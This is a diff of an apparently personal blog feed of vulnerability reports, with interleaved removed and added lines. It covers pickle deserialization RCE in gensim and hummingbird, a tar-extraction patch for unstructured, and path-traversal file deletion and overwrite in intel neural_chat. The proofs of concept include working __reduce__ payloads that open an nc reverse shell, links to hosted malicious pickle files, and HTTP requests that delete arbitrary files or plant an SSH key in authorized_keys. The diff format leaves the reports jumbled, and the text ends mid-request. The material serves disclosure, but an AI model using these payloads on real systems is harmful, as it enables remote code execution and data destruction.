-<p>The gensim api <a href="https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel.load"><code class="language-plaintext highlighter-rouge">gensim.models.ldamodel.LdaModel.load</code></a> is used to Load a LdaModel from file, and the LdaModel is stored in pickle file. In <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692"><code class="language-plaintext highlighter-rouge">LdaModel.load#L1692</code></a>, it uses <code class="language-plaintext highlighter-rouge">utils.unpickle</code> to deserilize the model file. And in <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460"><code class="language-plaintext highlighter-rouge">utils.unpickle</code></a>, it uses <code class="language-plaintext highlighter-rouge">pickle.load</code> to load the pickle model which will causing code injection when loading a malicious pickle file.</p>
+<p>Patch for <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L56C1-L67C16">uncompress_tar_file</a></p>
 
-<p>The vulnerable function: <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692"><code class="language-plaintext highlighter-rouge">LdaModel.load#L1692</code></a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@classmethod
-    def load(cls, fname, *args, **kwargs):
-    ...
-    id2word_fname = utils.smart_extension(fname, '.id2word')
-    ...
-    if os.path.isfile(id2word_fname):
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
+    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
+    def extraction_filter(member, path):
+        """Run tarfile.tar_filter, but raise the expected ValueError"""
+        # This is only called if the current Python has tarfile filters
         try:
-            # vulnerable to code injection !!!
-            result.id2word = utils.unpickle(id2word_fname)
-        except Exception as e:
-            logging.warning("failed to load id2word dictionary from %s: %s", id2word_fname, e)
-    return result
+            return tarfile.tar_filter(member, path)
+        except tarfile.FilterError as exc:
+            raise ValueError(str(exc))
+    
+    head, tail = os.path.split(tar_filename)
+    for ext in TAR_FILE_EXT:
+        if tail.endswith(ext):
+            tail = tail[: -(len(ext))]
+            break
+
+    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
+    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
+    with tarfile.open(tar_filename, "r:gz") as tfile:
+        tfile.extraction_filter = extraction_filter
+        tfile.extractall(path=path)
+    return path
 </code></pre></div></div>
-
-<p>The <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460"><code class="language-plaintext highlighter-rouge">utils.unpickle#L1460</code></a> funtion:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def unpickle(fname):
-    """Load object from `fname`, using smart_open so that `fname` can be on S3, HDFS, compressed etc.
-
-    Parameters
-    ----------
-    fname : str
-        Path to pickle file.
-
-    Returns
-    -------
-    object
-        Python object loaded from `fname`.
-
-    """
-    with open(fname, 'rb') as f:
-        # vulnerable to code injection !!!
-        return _pickle.load(f, encoding='latin1')  # needed because loading from S3 doesn't support readline()
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>Firstly, create a malicious pickle file. Use following snippets to create a malicous <code class="language-plaintext highlighter-rouge">payload.pickle</code> file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-import os
-
-class RCE:
-    def __reduce__(self):
-        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
-        return os.system, (cmd,)
-
-with open('payload.pickle', 'wb') as f:
-    pickle.dump(RCE(), f)
-</code></pre></div></div>
-
-<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></a> to github for testing.</p>
-
-<h2 id="start-attack">Start attack</h2>
-
-<p>Install latest gensim:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install gensim
-</code></pre></div></div>
-
-<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from gensim.models.ldamodel import LdaModel
-lda = LdaModel.load("payload.pickle")
-</code></pre></div></div>
-
-<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
-prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
-</code></pre></div></div>
-<h2 id="colab">Colab</h2>
-
-<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1XJkrl4-PEjd9lMl_Q-epTyBBORNbJjSj?usp=sharing">https://colab.research.google.com/drive/1XJkrl4-PEjd9lMl_Q-epTyBBORNbJjSj?usp=sharing</a></p>
-
-<p><img src="http://live.staticflickr.com/65535/53821790176_089365c3f3_k.jpg" alt="image" /></p>
 
 <h2 id="impact">Impact</h2>
 
-<p>This vulnerability can have severe consequences. If victims load a malicious pickle model using <code class="language-plaintext highlighter-rouge">LdaModel.load</code>, command injection can be achieved on victims’ mechine.</p>
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692">LdaModel.load#L1692</a></p>
+<p>Version v1</p>
 
-<p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460">utils.unpickle#L1460</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83</a></p>
+
+<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66</a></p>
+
+<p>Version V2</p>
+
+<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://localhost:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://localhost:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers</id><content type="html" xml:base="http://localhost:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
-  <p>Command injection via unsafe pickle.loads using api hummingbird.ml.load</p>
+  <p>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</p>
 </blockquote>
 
 <h2 id="weakness">Weakness</h2>
 
 <blockquote>
-  <p>CWE-94: Code Injection</p>
+  <p>CWE-22: Path Traversal</p>
 </blockquote>
 
 <h2 id="severity">Severity</h2>
@@ -1087,177 +756,472 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 <h2 id="version">Version</h2>
 
 <blockquote>
-  <p>0.4.11</p>
+  <p>v1.4.2</p>
 </blockquote>
 
 <h2 id="description">Description</h2>
 
-<p>Hummingbird can be used to convert trained traditional ML models into <a href="https://github.com/microsoft/hummingbird?tab=readme-ov-file#introduction">PyTorch, TorchScript, ONNX, and TVM</a>. In Hummingbird <a href="https://github.com/microsoft/hummingbird?tab=readme-ov-file#examples">official example</a>, it trains a scikit-learn RandomForestClassifier model, save the model to a zip file, and finally load the model back from the zip file.</p>
+<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L598"><code class="language-plaintext highlighter-rouge">/v1/askdoc/delete_file</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">del_path</code> parameter which allows the deletion of arbitrary file. The <code class="language-plaintext highlighter-rouge">del_path</code> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">without sanitization</a> and then the file is deleted. An attacker can delete files behalf of current process.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import numpy as np
-from sklearn.ensemble import RandomForestClassifier
-from hummingbird.ml import convert, load
+<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>
 
-# Create some random data for binary classification
-num_classes = 2
-X = np.random.rand(100000, 28)
-y = np.random.randint(num_classes, size=100000)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.delete("/v1/askdoc/delete_file")
+async def delete_single_file(request: Request):
+    """Delete file according to `del_path` and `knowledge_base_id`.
 
-# Create and train a model (scikit-learn RandomForestClassifier in this case)
-skl_model = RandomForestClassifier(n_estimators=10, max_depth=10)
-skl_model.fit(X, y)
-
-# Use Hummingbird to convert the model to PyTorch
-model = convert(skl_model, 'pytorch')
-
-# Run predictions on CPU
-model.predict(X)
-
-# Run predictions on GPU
-model.to('cuda')
-model.predict(X)
-
-# Save the model
-model.save('hb_model')
-
-# Load the model back
-model = load('hb_model')
-</code></pre></div></div>
-
-<p>After running the example snippets, it creates a <code class="language-plaintext highlighter-rouge">hb_model.zip</code> file containing all PyTorch model information. The structure of zipped model file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hb_model.zip
-    |___deploy_model.zip (pickle format)
-    |___model_configuration.txt
-    |___model_type.txt
-</code></pre></div></div>
-
-<p>When loading the model back, it uses <a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L108"><code class="language-plaintext highlighter-rouge">PyTorchSklearnContainer.load</code></a> to extract the zip file, and use <a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177"><code class="language-plaintext highlighter-rouge">pickle.load</code></a> to load the <code class="language-plaintext highlighter-rouge">deploy_model.zip</code> which is a pickle file.</p>
-
-<p>The vulnerable function: <a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177"><code class="language-plaintext highlighter-rouge">PyTorchSklearnContainer.load#L177</code></a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
-def load(location, do_unzip_and_model_type_check=True, delete_unzip_location_folder: bool = True,
-            digest=None, override_flag=False):
+    `del_path`:
+        - specific file path(e.g. /path/to/file.txt)
+        - folder path(e.g. /path/to/folder)
+        - "all_files": delete all files of this knowledge base
+    """
+    params = await request.json()
+    del_path = params['del_path']
     ...
-    # Unzip the dir.
-    if do_unzip_and_model_type_check:
-        zip_location = location
-        if not location.endswith("zip"):
-            zip_location = location + ".zip"
+    # partially delete files/folders from the kb
+    if delete_path.exists():
+        # delete file
+        if delete_path.is_file():
+            try:
+                delete_path.unlink()
+            except Exception as e:
+                logger.info(f"[askdoc - delete_file] fail to delete file {delete_path}: {e}")
+                raise HTTPException(
+                    status_code=500,
+                    detail=f'Failed to delete file {delete_path}. Exception: {e}'
+                )
+        # delete folder
         else:
-            location = zip_location[:-4]
-        assert os.path.exists(zip_location), "Zip file {} does not exist.".format(zip_location)
-    ...
-
-    if model_type == "torch.jit":
-        # This is a torch.jit model
-        model = torch.jit.load(os.path.join(location, constants.SAVE_LOAD_TORCH_JIT_PATH))
-        with open(os.path.join(location, "container.pkl"), "rb") as file:
-            # vulnerable to command injection !!!
-            container = pickle.load(file)
-        container._model = model
-    elif model_type == "torch":
-        # This is a pytorch  model
-        with open(os.path.join(location, constants.SAVE_LOAD_TORCH_JIT_PATH), "rb") as file:
-            # vulnerable to command injection !!!
-            container = pickle.load(file)
-    ...
-    return container
+            try:
+                shutil.rmtree(delete_path)
+            except Exception as e:
+                logger.info(f"[askdoc - delete_file] fail to delete folder {delete_path}: {e}")
+                raise HTTPException(
+                    status_code=500,
+                    detail=f'Failed to delete folder {delete_path}. Exception: {e}'
+                )
+        return {"status": True}
+    else:
+        raise HTTPException(status_code=404, detail="File/folder not found. Please check del_path.")
 </code></pre></div></div>
 
 <h2 id="proof-of-concept">Proof of Concept</h2>
 
-<p>Firstly, install latest hummingbird</p>
+<p>First, we create a test file at <code class="language-plaintext highlighter-rouge">/home/kali/test.txt</code>:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install hummingbird-ml
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# touch /home/kali/test.txt
+kali@fc7d9ff6a411:/# ls /home/kali/test.txt
+-rw-r--r-- 1 kali kali 0 May 27 16:29 /home/kali/test.txt
 </code></pre></div></div>
 
-<p>And create a valid pytorch model file following <a href="https://github.com/microsoft/hummingbird?tab=readme-ov-file#examples">official example</a>:</p>
+<p>Then we start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import numpy as np
-from sklearn.ensemble import RandomForestClassifier
-from hummingbird.ml import convert, load
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
+sudo apt-get update
+sudo apt-get install -y python3-pip
+sudo apt-get install -y libgl1-mesa-glx
 
-# Create some random data for binary classification
-num_classes = 2
-X = np.random.rand(100000, 28)
-y = np.random.randint(num_classes, size=100000)
+# clone the project
+git clone https://github.com/intel/intel-extension-for-transformers.git
+cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/
 
-# Create and train a model (scikit-learn RandomForestClassifier in this case)
-skl_model = RandomForestClassifier(n_estimators=10, max_depth=10)
-skl_model.fit(X, y)
-
-# Use Hummingbird to convert the model to PyTorch
-model = convert(skl_model, 'pytorch')
-
-# Run predictions on CPU
-model.predict(X)
-
-# Run predictions on GPU
-model.to('cuda')
-model.predict(X)
-
-# Save the model
-model.save('hb_model')
+# Install python requirements
+pip install -r requirements_cpu.txt
+pip install fastapi==0.103.2
+pip install intel-extension-for-transformers
 </code></pre></div></div>
 
-<p>Now we have a valid pytorch model file in zip format:</p>
+<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hb_model.zip
-    |___deploy_model.zip (pickle format)
-    |___model_configuration.txt
-    |___model_type.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
+neuralchat_server start --config_file ./server/config/neuralchat.yaml
 </code></pre></div></div>
 
-<p>Create a malicious pickle file named <code class="language-plaintext highlighter-rouge">deploy_model.zip</code></p>
+<p>Send follow post request to the server using burpsuite to delete single file:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-import os
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+content-type: application/json
+Cookie: 
+Connection: close
+Content-Length: 89
 
-class RCE:
-    def __reduce__(self):
-        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
-        return os.system, (cmd,)
-
-with open('deploy_model.zip', 'wb') as f:
-    pickle.dump(RCE(), f)
+{"del_path":"/home/kali/test.txt","knowledge_base_id":"123"}
 </code></pre></div></div>
 
-<p>Use following command to replace and update the <code class="language-plaintext highlighter-rouge">deploy_model.zip</code> file in <code class="language-plaintext highlighter-rouge">hb_model.zip</code>:</p>
+<p>The response indicates the file is deleted.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip -u hb_model.zip deploy_model.zip
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Length: 15
+Connection: keep-alive
+Content-Type: application/json
+Date: Mon, 27 May 2024 06:26:58 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: uvicorn
+
+{"status":true}
 </code></pre></div></div>
 
-<p>Now we have a malicious pytorch model file <code class="language-plaintext highlighter-rouge">hb_model.zip</code>, you can download from <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/hb_model.zip">github</a>.</p>
+<p>We can verify the the file is deleted using following command:</p>
 
-<h3 id="start-attack">Start attack</h3>
-
-<p>Use following snippets to load the model back, it will trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from hummingbird.ml import load
-load("hb_model", override_flag=True)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# ls /home/kali/test.txt
+ls: cannot access '/home/kali/test.txt': No such file or directory
 </code></pre></div></div>
 
-<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
+<p>Delete a folder using following command:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
-prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+content-type: application/json
+Cookie: 
+Connection: close
+Content-Length: 89
+
+{"del_path":"/home/kali/test-folder","knowledge_base_id":"123"}
 </code></pre></div></div>
-
-<h3 id="colab">Colab</h3>
-
-<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1vr8BG1rQhJf7qLFoXLZLOCKxFYnqsuY2?usp=sharing">https://colab.research.google.com/drive/1vr8BG1rQhJf7qLFoXLZLOCKxFYnqsuY2?usp=sharing</a></p>
-
-<p><img src="http://live.staticflickr.com/65535/53823382430_a03098fdc4_k.jpg" alt="image" /></p>
 
 <h2 id="impact">Impact</h2>
 
-<p>This vulnerability can have severe consequences. If victims load a malicious pytorch model using <code class="language-plaintext highlighter-rouge">hummingbird.ml.load</code>, command injection can be achieved on victims’ mechine.</p>
+<p>This vulnerability can delete any files and folders the service process could access.</p>
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L172">PyTorchSklearnContainer.load#L172</a></p>
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>]]></content><author><name></name></author><category term="file-deletion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
 
-<p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177">PyTorchSklearnContainer.load#L177</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat.</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>v1.4.2</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296"><code class="language-plaintext highlighter-rouge">/v1/askdoc/upload_files</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">file_paths</code> parameter which allows the uploading of arbitrary files. The <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L308C32-L308C42"><code class="language-plaintext highlighter-rouge">file_path</code></a> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">without sanitization</a> and the file content is writen to dest location. An attacker can upload and overwrite <strong>ANY</strong> file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/v1/askdoc/upload_files")
+async def retrieval_add_files(request: Request,
+                           files: List[UploadFile] = File(...),
+                           file_paths: List[str] = Form(...),
+                           knowledge_base_id: str = Form(...)):
+    ...
+    for file_path, file in zip(file_paths, files):
+        filename = file.filename
+        if '/' in filename:
+            filename = filename.split('/')[-1]
+        logger.info(f"[askdoc - upload_files] received file: {filename}, kb_id: {kb_id}")
+        user_id = request.client.host
+        logger.info(f'[askdoc - upload_files] user id: {user_id}')
+
+        path_prefix = get_path_prefix(kb_id, user_id)
+        upload_path = path_prefix + '/upload_dir'
+        persist_path = path_prefix + '/persist_dir'
+        save_path = Path(upload_path) / file_path
+        save_path.parent.mkdir(parents=True, exist_ok=True)
+
+        # save file content to local disk
+        await save_file_to_local_disk(save_path, file)
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the neural_chat service and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
+sudo apt-get update
+sudo apt-get install -y python3-pip
+sudo apt-get install -y libgl1-mesa-glx
+
+# clone the project
+git clone https://github.com/intel/intel-extension-for-transformers.git
+cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/
+
+# Install python requirements
+pip install -r requirements_cpu.txt
+pip install fastapi==0.103.2
+pip install intel-extension-for-transformers
+</code></pre></div></div>
+
+<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
+neuralchat_server start --config_file ./server/config/neuralchat.yaml
+</code></pre></div></div>
+
+<p>Send follow post request to the server using burpsuite:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://10.15.0.5:8000/v1/askdoc/upload_files HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
